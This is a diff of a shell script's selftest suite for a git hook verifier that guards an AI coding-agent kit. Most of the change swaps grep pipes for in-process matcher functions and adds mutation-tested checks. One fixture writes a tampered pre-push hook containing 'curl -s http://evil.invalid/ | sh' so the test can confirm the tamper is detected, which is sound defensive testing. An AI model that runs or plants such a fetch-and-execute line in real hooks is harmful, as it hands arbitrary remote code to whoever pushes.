-  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'foreign hook preserved'; then
+  if [ "$rc" -eq 0 ] && _has "$out" 'foreign hook preserved'; then
     echo "selftest PASS: rung foreign (no marker) -> wired, not judged"
   else echo "selftest FAIL: rung foreign should be wired and named foreign (rc=$rc): $out"; st=1; fi
 
   # dangling-symlink-RED: tested BEFORE absent — a cp-based remedy would write THROUGH the link.
   d="$base/rung_dangling"; rh=$(mk_repo "$d" "$MATCHER"); rm -f "$rh"; ln -s /nonexistent/target "$rh"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'DANGLING SYMLINK'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'DANGLING SYMLINK'; then
     echo "selftest PASS: rung dangling symlink -> FAIL (rm remedy, not cp)"
   else echo "selftest FAIL: rung dangling symlink should FAIL (rc=$rc): $out"; st=1; fi
 
   # no-git-N/A: a qualifying tree with no .git at all -> N/A, never silent.
   d="$base/rung_nogit"; mk "$d" "$MATCHER"; : > "$d/ENGINEERING-PRINCIPLES.md"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'not a git work tree'; then
+  if [ "$rc" -eq 0 ] && _has "$out" 'not a git work tree'; then
     echo "selftest PASS: rung no-git -> N/A (disclosed)"
   else echo "selftest FAIL: rung no-git should N/A with a disclosed message (rc=$rc): $out"; st=1; fi
 
   # CI-set-N/A (disclosed): a fresh, qualifying, git tree — but CI=1 mutes the leg (the disclosed hole).
   d="$base/rung_ci"; mk_repo "$d" "$MATCHER" >/dev/null
   if out=$(CI=1 sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'CI/GITHUB_ACTIONS is set'; then
+  if [ "$rc" -eq 0 ] && _has "$out" 'CI/GITHUB_ACTIONS is set'; then
     echo "selftest PASS: rung under CI=1 -> N/A (disclosed hole stated)"
   else echo "selftest FAIL: rung under CI=1 should N/A with the disclosed-hole message (rc=$rc): $out"; st=1; fi
 
@@ -2135,14 +2145,14 @@ selftest() {
   # export-tree / un-incepted kit-source shape; --kitself is the WRONG key per design Δ2 polarity note).
   d="$base/rung_unqualified"; mk_repo "$d" "$MATCHER" nomarker >/dev/null
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'nothing to certify here'; then
+  if [ "$rc" -eq 0 ] && _has "$out" 'nothing to certify here'; then
     echo "selftest PASS: rung on an unqualifying tree -> N/A"
   else echo "selftest FAIL: rung on an unqualifying tree should N/A (rc=$rc): $out"; st=1; fi
 
   # core-missing-RED: fresh + marked + byte-matching, but the D3 core target is absent — not core-resolvable.
   d="$base/rung_coremissing"; mk_repo "$d" "$MATCHER" >/dev/null; rm -f "$d/.claude/hooks/guard-core.sh"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'not core-resolvable'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'not core-resolvable'; then
     echo "selftest PASS: rung fresh but core-missing -> FAIL (not core-resolvable)"
   else echo "selftest FAIL: rung with a missing core target should FAIL (rc=$rc): $out"; st=1; fi
 
@@ -2153,7 +2163,7 @@ selftest() {
   git -C "$d" rm --cached -q hooks/pre-push >/dev/null
   git -C "$d" -c user.name=b3-selftest -c user.email=b3-selftest@example.invalid commit -q -m "drop tracked hook" >/dev/null
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'missing from HEAD'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'missing from HEAD'; then
     echo "selftest PASS: rung tracked-missing -> FAIL (its own verdict, not STALE)"
   else echo "selftest FAIL: rung tracked-missing should FAIL with its own verdict (rc=$rc): $out"; st=1; fi
 
@@ -2161,7 +2171,7 @@ selftest() {
   # which is what an adopter hits first. Both directions asserted: the true cause NAMED and the harmful remedy ABSENT (a message saying both is still misleading).
   d="$base/rung_nocommits"; mk_repo "$d" "$MATCHER" >/dev/null; git -C "$d" update-ref -d HEAD >/dev/null 2>&1 || true
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'no commits yet' && ! printf '%s' "$out" | grep -q 'recopy'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'no commits yet' && ! _has "$out" 'recopy'; then
     echo "selftest PASS: rung on a HEAD-less tree -> FAIL naming 'no commits yet', never 'recopy'"
   else echo "selftest FAIL: a HEAD-less tree must red with the no-commits cause and NO recopy advice (rc=$rc): $out"; st=1; fi
 
@@ -2174,7 +2184,7 @@ selftest() {
   # Δ2 FALSE-POSITIVE LOCK: this fixture is an ADOPTER tree (mk_repo stamps only the adopter marker),
   # so the SAME value that REDs as DISARMED on a kit-source tree below must still take D2's disclosed
   # skip here, verbatim — the kit does not judge a husky/lefthook adopter's own hooks dir.
-  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q "core.hooksPath redirects hooks to '.husky'" && ! printf '%s' "$out" | grep -q 'DISARMED'; then
+  if [ "$rc" -eq 0 ] && _has "$out" "core.hooksPath redirects hooks to '.husky'" && ! _has "$out" 'DISARMED'; then
     echo "selftest PASS: rung hooksPath='.husky' (adopter main worktree) -> disclosed-skip N/A, never DISARMED"
   else echo "selftest FAIL: rung hooksPath='.husky' should disclosed-skip N/A (rc=$rc): $out"; st=1; fi
 
@@ -2186,7 +2196,7 @@ selftest() {
   wt="$base/rung_wt_linked"
   if git -C "$d" worktree add -q "$wt" -b rung-wt-branch >/dev/null 2>&1 && git -C "$wt" config core.hooksPath .git/hooks >/dev/null 2>&1; then
     if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$wt" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'not installed at' && printf '%s' "$out" | grep -q 'RELATIVE in a linked worktree'; then
+    if [ "$rc" -eq 1 ] && _has "$out" 'not installed at' && _has "$out" 'RELATIVE in a linked worktree'; then
       echo "selftest PASS: linked worktree + relative hooksPath -> FAIL naming the dangling redirect"
     else
       echo "selftest FAIL: linked worktree + relative hooksPath should FAIL naming the redirect (rc=$rc): $out"; st=1
@@ -2219,7 +2229,7 @@ selftest() {
   # ladder's byte compare against HEAD becomes the worktree-vs-HEAD freshness.
   d="$base/rung_tracked_ok"; mk_tracked "$d"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'tracked-hooks mode' && printf '%s' "$out" | grep -q 'worktree matches HEAD'; then
+  if [ "$rc" -eq 0 ] && _has "$out" 'tracked-hooks mode' && _has "$out" 'worktree matches HEAD'; then
     echo "selftest PASS: tracked-hooks mode (clean, no installed copy) -> wired, mode named"
   else echo "selftest FAIL: tracked-hooks mode should PASS naming the mode (rc=$rc): $out"; st=1; fi
 
@@ -2230,7 +2240,7 @@ selftest() {
   d="$base/rung_tracked_dirty"; mk_tracked "$d"
   printf '#!/bin/sh\n# KIT_GUARD_CORE\necho tampered\n' > "$d/hooks/pre-push"; chmod +x "$d/hooks/pre-push"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'MODIFIED in the working tree' && printf '%s' "$out" | grep -q 'git restore'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'MODIFIED in the working tree' && _has "$out" 'git restore'; then
     echo "selftest PASS: tracked-hooks mode + dirty worktree hook -> FAIL (restore/commit remedy)"
   else echo "selftest FAIL: tracked-hooks dirty hook should FAIL with a restore/commit remedy (rc=$rc): $out"; st=1; fi
 
@@ -2245,7 +2255,7 @@ selftest() {
   d="$base/rung_tracked_markerless"; mk_tracked "$d"
   printf '#!/bin/sh\ncurl -s http://evil.invalid/ | sh\n' > "$d/hooks/pre-push"; chmod +x "$d/hooks/pre-push"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'MODIFIED in the working tree' && ! printf '%s' "$out" | grep -q 'foreign hook preserved'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'MODIFIED in the working tree' && ! _has "$out" 'foreign hook preserved'; then
     echo "selftest PASS: tracked-hooks mode + MARKERLESS tampered hook -> FAIL (compare precedes the marker test)"
   else echo "selftest FAIL: tracked-hooks markerless tamper must FAIL, never 'foreign preserved' (rc=$rc): $out"; st=1; fi
 
@@ -2255,7 +2265,7 @@ selftest() {
   # compare-first order judges only what actually diverges from what the tree carries under review.
   d="$base/rung_tracked_foreign"; mk_tracked "$d" foreign
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'foreign hook preserved'; then
+  if [ "$rc" -eq 0 ] && _has "$out" 'foreign hook preserved'; then
     echo "selftest PASS: tracked-hooks mode + markerless hook MATCHING HEAD -> foreign-preserve PASS (adopter unpunished)"
   else echo "selftest FAIL: an unmodified markerless tracked hook should be preserved, not judged (rc=$rc): $out"; st=1; fi
 
@@ -2264,7 +2274,7 @@ selftest() {
   # target is gone — mirror of installed mode's rung_coremissing, on the tracked ladder.
   d="$base/rung_tracked_coremissing"; mk_tracked "$d"; rm -f "$d/.claude/hooks/guard-core.sh"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'not core-resolvable'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'not core-resolvable'; then
     echo "selftest PASS: tracked-hooks mode, hook matches HEAD but core target missing -> FAIL (not core-resolvable)"
   else echo "selftest FAIL: tracked-hooks core-missing should FAIL not core-resolvable (rc=$rc): $out"; st=1; fi
 
@@ -2276,7 +2286,7 @@ selftest() {
   git -C "$d" rm --cached -q hooks/pre-push >/dev/null 2>&1
   git -C "$d" -c user.name=b3-selftest -c user.email=b3-selftest@example.invalid commit -q -m "drop tracked hook" >/dev/null 2>&1
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'missing from HEAD'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'missing from HEAD'; then
     echo "selftest PASS: tracked-hooks mode, hook not committed at HEAD -> FAIL (missing from HEAD)"
   else echo "selftest FAIL: tracked-hooks HEAD-missing should FAIL missing from HEAD (rc=$rc): $out"; st=1; fi
 
@@ -2286,7 +2296,7 @@ selftest() {
   mkdir -p "$d/docs"; : > "$d/docs/ROADMAP-KIT.md"
   git -C "$d" config core.hooksPath .husky
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'DISARMED'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'DISARMED'; then
     echo "selftest PASS: kit-source tree + foreign hooksPath -> FAIL (rung DISARMED)"
   else echo "selftest FAIL: kit-source tree + foreign hooksPath should FAIL as DISARMED (rc=$rc): $out"; st=1; fi
 
@@ -2299,7 +2309,7 @@ selftest() {
   gh_home="$base/rung_kit_globalhome"; mkdir -p "$gh_home"
   printf '[core]\n\thooksPath = %s\n' "$base/nowhere-hooks" > "$gh_home/.gitconfig"
   if out=$(CI='' GITHUB_ACTIONS='' HOME="$gh_home" XDG_CONFIG_HOME="$gh_home/.config" sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'DISARMED' && printf '%s' "$out" | grep -q -- '--global'; then
+  if [ "$rc" -eq 1 ] && _has "$out" 'DISARMED' && _has "$out" '--global'; then
     echo "selftest PASS: kit-source tree + GLOBAL hooksPath -> FAIL naming the global-config cure"
   else echo "selftest FAIL: kit-source + global hooksPath should FAIL naming the global cure (rc=$rc): $out"; st=1; fi
 
@@ -2313,12 +2323,12 @@ selftest() {
   wt="$base/rung_tracked_wt_linked"
   if git -C "$d" worktree add -q "$wt" -b rung-tracked-wt >/dev/null 2>&1; then
     if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$wt" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'tracked-hooks mode'; then
+    if [ "$rc" -eq 0 ] && _has "$out" 'tracked-hooks mode'; then
       echo "selftest PASS: linked worktree in tracked-hooks mode (clean) -> wired, mode named"
     else echo "selftest FAIL: linked worktree in tracked-hooks mode should PASS (rc=$rc): $out"; st=1; fi
     printf '#!/bin/sh\n# KIT_GUARD_CORE\necho tampered\n' > "$wt/hooks/pre-push"; chmod +x "$wt/hooks/pre-push"
     if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$wt" 2>&1); then rc=0; else rc=$?; fi
-    if [ "$rc" -eq 1 ] && printf '%s' "$out" | grep -q 'MODIFIED in the working tree'; then
+    if [ "$rc" -eq 1 ] && _has "$out" 'MODIFIED in the working tree'; then
       echo "selftest PASS: linked worktree in tracked-hooks mode + dirty hook -> FAIL (no freshness N/A)"
     else echo "selftest FAIL: linked worktree dirty hook should FAIL, not N/A (rc=$rc): $out"; st=1; fi
   else
@@ -2343,7 +2353,7 @@ selftest() {
   cp "$d/hooks/pre-push" "$rh"
   chmod +x "$rh"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q 'FRESH'; then
+  if [ "$rc" -eq 0 ] && _has "$out" 'FRESH'; then
     echo "selftest PASS: --separate-git-dir MAIN worktree -> full ladder, FRESH (not misread as linked)"
   else echo "selftest FAIL: --separate-git-dir MAIN worktree should be FRESH via the full ladder (rc=$rc): $out"; st=1; fi
 
@@ -2353,8 +2363,8 @@ selftest() {
   ctrl_seg=$(printf 'ctrlx\011dir')
   d="$base/$ctrl_seg"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" "$d" 2>&1); then rc=0; else rc=$?; fi
-  refusal_line=$(printf '%s\n' "$out" | grep 'refusing to evaluate' || true)
-  if [ "$rc" -eq 1 ] && [ -n "$refusal_line" ] && ! printf '%s' "$refusal_line" | grep -qF "$ctrl_seg"; then
+  if refusal_line=$(_grepx "$out" 'refusing to evaluate'); then :; fi
+  if [ "$rc" -eq 1 ] && [ -n "$refusal_line" ] && ! _has "$refusal_line" "$ctrl_seg"; then
     echo "selftest PASS: hostile \$dir rung leg -> static refusal line, no path printed"
   else
     echo "selftest FAIL: hostile \$dir rung leg should statically refuse without printing the path (rc=$rc): $out"; st=1
@@ -2364,14 +2374,90 @@ selftest() {
   # certifying only the PreToolUse legs must exit 0 — the second rung is not even evaluated.
   d="$base/rung_rung1only"; mk "$d" "$MATCHER"; : > "$d/ENGINEERING-PRINCIPLES.md"
   if out=$(CI='' GITHUB_ACTIONS='' sh "$0" --rung1-only "$d" 2>&1); then rc=0; else rc=$?; fi
-  if [ "$rc" -eq 0 ] && printf '%s' "$out" | grep -q -- '--rung1-only'; then
+  if [ "$rc" -eq 0 ] && _has "$out" '--rung1-only'; then
     echo "selftest PASS: --rung1-only on a hookless qualifying tree -> rc 0, second rung not evaluated"
   else echo "selftest FAIL: --rung1-only on a hookless qualifying tree should exit 0 (rc=$rc): $out"; st=1; fi
+
+  # MTC1-MTC5 (SWAS-577) — the in-process matcher (_has, _has_line), the rc-aware wrapper (_grepx) and the matcher grader's rc split. Each cell carries its own mutant
+  # (a function redefined in a subshell, or a sed of this file into a throwaway copy): no knob.
+  _mtc_nl='
+'
+  _mtc_h="line one${_mtc_nl}line two"
+  _mtc_fn=$(sed -n '/^_has() {/,/^}/p' "$0")
+  _mtc_mut=$(printf '%s\n' "$_mtc_fn" | sed 's/\*"\$2"\*) return 0/*) return 0/')
+  if _has "abc def" def && ! _has "abc def" xyz && _has "abc" "" && ! _has "" x && _has "$_mtc_h" "one${_mtc_nl}line" && ! _has "$_mtc_h" "two${_mtc_nl}line"; then
+    if [ -n "$_mtc_fn" ] && [ "$_mtc_mut" != "$_mtc_fn" ] && ( eval "$_mtc_mut"; _has "abc def" xyz ); then echo "selftest PASS: MTC1 — _has answers present, absent, empty-needle and multi-line questions, and an always-true mutant made by a sed of the real function text flips the absent question (the cell has teeth)"
+    else echo "selftest FAIL: MTC1 — the always-true mutant of _has did not apply or did not flip the absent-needle question"; st=1; fi
+  else echo "selftest FAIL: MTC1 — _has answered a present/absent/empty/multi-line question wrongly"; st=1; fi
+  _mtc_fn=$(sed -n '/^_has() {/,/^}/p' "$0")
+  _mtc_want="y1${_mtc_nl}n1${_mtc_nl}y2${_mtc_nl}n2${_mtc_nl}y3${_mtc_nl}n3${_mtc_nl}y4${_mtc_nl}n4"
+  for _mtc_sh in sh dash bash; do
+    if ! command -v "$_mtc_sh" >/dev/null 2>&1; then echo "selftest SKIP: MTC2[$_mtc_sh] — the shell is absent here"; continue; fi
+    _mtc_o=$("$_mtc_sh" -c "$_mtc_fn
+_has 'x a\\b y' 'a\\b' && echo y1
+_has 'x ab y' 'a\\b' || echo n1
+_has 'x * y' '*' && echo y2
+_has 'x ab y' '*' || echo n2
+_has 'x ? y' '?' && echo y3
+_has 'xy' '?' || echo n3
+_has 'x [ y' '[' && echo y4
+_has 'x a y' '[a]' || echo n4" 2>&1)
+    if [ -n "$_mtc_fn" ] && [ "$_mtc_o" = "$_mtc_want" ]; then echo "selftest PASS: MTC2[$_mtc_sh] — _has treats a backslash and the glob characters * ? [ literally"
+    else echo "selftest FAIL: MTC2[$_mtc_sh] — _has mishandled a backslash or glob needle (got: $_mtc_o)"; st=1; fi
+  done
+  mkdir -p "$base/mtc/bin2" "$base/mtc/bin3"
+  printf '#!/bin/sh\nexit 2\n' > "$base/mtc/bin2/grep"; chmod +x "$base/mtc/bin2/grep"
+  printf '#!/bin/sh\nkill -TERM $$\n' > "$base/mtc/bin3/grep"; chmod +x "$base/mtc/bin3/grep"
+  _mtc_r=$( _unv_f="$base/mtc/m0"; _grepx abc -q b && echo a0 || echo a$?; _grepx abc -q z && echo b0 || echo b$? )
+  if [ "$_mtc_r" = "a0${_mtc_nl}b1" ] && [ ! -s "$base/mtc/m0" ]; then echo "selftest PASS: MTC3a — _grepx passes grep's rc 0 and rc 1 through and marks nothing"
+  else echo "selftest FAIL: MTC3a — _grepx altered grep's own answer (got: $_mtc_r)"; st=1; fi
+  for _mtc_s in 2:bin2 143:bin3; do
+    _mtc_rc=${_mtc_s%%:*}; _mtc_b=${_mtc_s#*:}
+    if ( _unv_f="$base/mtc/m$_mtc_b"; PATH="$base/mtc/$_mtc_b:$PATH"; export PATH
+         if _mtc_x=$(_grepx abc -q b 2>&1); then :; fi
+         _has "$_mtc_x" "UNVERIFIED (grep rc=$_mtc_rc)" && [ -s "$_unv_f" ] && ! _unv_end >/dev/null ); then
+      echo "selftest PASS: MTC3[$_mtc_b] — a grep that exits $_mtc_rc inside \$( ) prints UNVERIFIED (grep rc=$_mtc_rc), marks the run, and _unv_end reads non-zero"
+    else echo "selftest FAIL: MTC3[$_mtc_b] — an unanswered grep (rc $_mtc_rc) was not marked or not read back by _unv_end"; st=1; fi
+  done
+  _mtc_gx=$(sed -n '/^_grepx() {/,/^}/p' "$0")
+  _mtc_gm=$(printf '%s\n' "$_mtc_gx" | sed '/>> "\$_unv_f"/d')
+  if [ -n "$_mtc_gx" ] && [ "$_mtc_gm" != "$_mtc_gx" ] && ( _unv_f="$base/mtc/mm"; : > "$_unv_f"; PATH="$base/mtc/bin2:$PATH"; export PATH; eval "$_mtc_gm"
+       if _mtc_x=$(_grepx abc -q b 2>&1); then :; fi
+       _unv_end >/dev/null ); then echo "selftest PASS: MTC3m — with the marker write deleted from the real _grepx text (a sed), _unv_end reads clean, so MTC3's marker assertion has teeth"
+  else echo "selftest FAIL: MTC3m — the marker-drop mutant of _grepx did not apply or still read non-zero: MTC3 pins nothing"; st=1; fi
+  # MTC6 (SWAS-577, S-LOW-1): a marker file that is missing or unnamed reads RED, never clean; the mutant is the real _unv_end text with its existence test turned off
+  _mtc_ue=$(sed -n '/^_unv_end() {/,/^}/p' "$0")
+  _mtc_um=$(printf '%s\n' "$_mtc_ue" | sed 's/^  if \[ -z .*# UNVMISS$/  if false; then/')
+  if [ -n "$_mtc_ue" ] && [ "$_mtc_um" != "$_mtc_ue" ] && ( _unv_f="$base/mtc/gone"; rm -f "$_unv_f"; ! _unv_end >/dev/null ) && ( _unv_f=""; ! _unv_end >/dev/null ) \
+     && ( _unv_f="$base/mtc/gone"; rm -f "$_unv_f"; eval "$_mtc_um"; _unv_end >/dev/null ); then echo "selftest PASS: MTC6 — _unv_end reads RED on a missing or unnamed marker file, and the real text with its existence test off reads clean (the cell has teeth)"
+  else echo "selftest FAIL: MTC6 — _unv_end did not red on a missing marker, or its mutant did not apply or still read non-zero"; st=1; fi
+  # MTC4 (control 2): a ^-anchored needle matches only at a line start
+  _mtc_hl=$(sed -n '/^_has_line() {/,/^}/p' "$0")
+  _mtc_hm=$(printf '%s\n' "$_mtc_hl" | sed 's/\*"\$_hl_nl\$2"\*/*"$2"*/')
+  if ! _has_line "see FAIL: here" FAIL && _has_line "ok${_mtc_nl}FAIL: here" FAIL && _has_line "FAIL: first" FAIL; then
+    if [ -n "$_mtc_hl" ] && [ "$_mtc_hm" != "$_mtc_hl" ] && ( eval "$_mtc_hm"; _has_line "see FAIL: here" FAIL ); then echo "selftest PASS: MTC4 — _has_line matches only at a line start, and the real text with its newline anchor removed (a sed) flips the mid-line question (the cell has teeth)"
+    else echo "selftest FAIL: MTC4 — the no-anchor mutant of _has_line did not apply or did not flip the mid-line question"; st=1; fi
+  else echo "selftest FAIL: MTC4 — _has_line answered a mid-line / second-line / first-line question wrongly"; st=1; fi
+  # MTC5 (control 3): the matcher grader splits grep's rc. A fixture grep answers rc 2 for the grader's own call only and hands every other call to the real grep.
+  d="$base/mtc5"; mk "$d" 'Bash|Write|Edit|NotebookEdit|mcp__.*'
+  mkdir -p "$base/gstub"; _mtc_rg=$(command -v grep)
+  printf '%s\n' '#!/bin/sh' 'case "$*" in' '  "-Eq ^(Bash|Write|Edit|NotebookEdit|mcp__.*)$") echo "stub grep: simulated failure" >&2; exit 2 ;;' 'esac' "exec $_mtc_rg \"\$@\"" > "$base/gstub/grep"; chmod +x "$base/gstub/grep"
+  if out=$(PATH="$base/gstub:$PATH" sh "$0" --rung1-only "$d" 2>&1); then rc=0; else rc=$?; fi
+  if [ "$rc" -eq 1 ] && _has "$out" 'grader error' && _has "$out" 'rc=2' && _has "$out" 'simulated failure' && ! _has "$out" 'does not admit mutating tool' && ! _has "$out" 'admits the mutating tools'; then
+    sed '/# GWM-GE$/s/.*/              *) missing="$missing $t" ;;/' "$0" > "$base/gr_m.sh"
+    if cmp -s "$0" "$base/gr_m.sh"; then echo "selftest FAIL: MTC5 — the grader mutant did not apply (nothing to mutate)"; st=1
+    else
+      if outm=$(PATH="$base/gstub:$PATH" sh "$base/gr_m.sh" --rung1-only "$d" 2>&1); then rcm=0; else rcm=$?; fi
+      if [ "$rcm" -eq 1 ] && _has "$outm" 'does not admit mutating tool' && ! _has "$outm" 'grader error'; then echo "selftest PASS: MTC5 — a grep that answers rc 2 for the matcher call is a named grader error (rc=$rc), never 'does not admit'; restoring the old swallow reads 'does not admit' (the cell has teeth)"
+      else echo "selftest FAIL: MTC5 — the old-swallow mutant did not read 'does not admit' (rc=$rcm): $outm"; st=1; fi
+    fi
+  else echo "selftest FAIL: MTC5 — a grep rc 2 on the matcher call must be a named grader error with rc 1 (rc=$rc): $out"; st=1; fi
 
   # SANITIZER-UNSET-RESTORES-EXPORTED: the bash-as-/bin/sh lock on _gw_git (see the function's header
   # below; it is the twin of inception-done.sh's (b10) leg and of scripts/kit-update.sh's).
   selftest_sanitizer_bash_unset
 
+  _unv_end || st=1
   if [ "$st" -ne 0 ]; then echo "guard-wired --selftest: FAIL" >&2; return 1; fi
   echo "guard-wired --selftest: OK (sandbox: the off default wired with the Edit denies still required; the strict block, in settings.json, an adopter's settings.local.json (arrays concatenate, local scalars win) or the shipped template, FAILs on each required key/denyWrite entry removed; --sandbox-enforce SKIP/FAIL routes against the merged strict profile; full/wildcard wired; no-mcp/degenerate/Read-only/partial/missing fail; rung fresh/foreign wired, absent/stale/non-exec/dangling/core-missing/tracked-missing FAIL, HEAD-less tree FAILs naming the missing first commit (never 'recopy'), no-git/CI=1/unqualifying/hooksPath-genuine N/A, linked-worktree+relative-hooksPath and --separate-git-dir and GIT_DIR-reroute and hostile-\$dir all correctly resolved, --rung1-only skips rung 2; tracked-hooks mode wired clean (main + linked worktree) and RED when the worktree hook is MODIFIED, kit-source disarm RED (local + global scope) while the adopter D2 skip holds; fixtures left in $base)"
   return 0
@@ -2417,6 +2503,50 @@ GIT_DIR='$_sbu_dn/.git' GIT_WORK_TREE='$_sbu_dn' _sbu_probe" 2>&1 ) || true
   fi
   echo "selftest FAIL: _gw_git let a forged core.hooksPath through under bash-as-/bin/sh -> [$_sbu_out]"
   st=1
+  return 1
+}
+
+# --- SWAS-577: the in-process matcher and the rc-aware wrapper. Below selftest() on purpose: the non-vacuity sweep mutates only lines BEFORE the marker.
+# _has <haystack> <needle> — 0 iff the needle occurs in the haystack, literally (equal to grep -F for a needle with no newline). In-process: no fork, no signal, rc 0 or 1 only, so ! _has is safe.
+# _has "" "" is true; no call site passes an empty needle.
+_has() {
+  case $1 in
+    *"$2"*) return 0 ;;
+  esac
+  return 1
+}
+# _has_line <haystack> <needle> — 0 iff some line of the haystack STARTS with the needle (equal to BRE grep -q '^needle' for a needle with none of . * [ \). The newline is prepended to both sides.
+_has_line() {
+  _hl_nl='
+'
+  case "$_hl_nl$1" in
+    *"$_hl_nl$2"*) return 0 ;;
+  esac
+  return 1
+}
+# _grepx <haystack> <grep-args...> — grep over a captured string, for the shapes case cannot answer (-c, an extracted line). rc 0 and 1 are grep's own answer and pass through.
+# Any other rc (an error, a spawn failure, a signal) is NOT an answer: print UNVERIFIED (grep rc=N) to stderr, append one line to the marker file $_unv_f (a $( ) subshell cannot lose a file), and return 2. The verdict reads the marker, never this return code.
+_grepx() {
+  _gx_h=$1; shift
+  _gx_rc=0
+  printf '%s\n' "$_gx_h" | grep "$@" || _gx_rc=$?
+  case $_gx_rc in
+    0|1) return "$_gx_rc" ;;
+  esac
+  printf 'selftest UNVERIFIED (grep rc=%s): grep %s\n' "$_gx_rc" "$*" >&2
+  printf 'rc=%s grep %s\n' "$_gx_rc" "$*" >> "$_unv_f"
+  return 2
+}
+# _unv_end — the final verdict's read of the marker: rc 1 (and one FAIL line naming the count) when any grep call could not answer.
+_unv_end() {
+  if [ -z "${_unv_f:-}" ] || [ ! -f "$_unv_f" ]; then   # UNVMISS
+    echo "selftest FAIL: UNVERIFIED: the marker file is missing or unnamed, so an unanswered grep could not have been recorded"
+    return 1
+  fi
+  [ -s "$_unv_f" ] || return 0
+  _un_n=0
+  while IFS= read -r _un_l || [ -n "$_un_l" ]; do _un_n=$((_un_n + 1)); done < "$_unv_f"
+  echo "selftest FAIL: UNVERIFIED: $_un_n grep call(s) could not answer (rc 2 or more, or a signal), so the verdict is not a PASS"
   return 1
 }
 
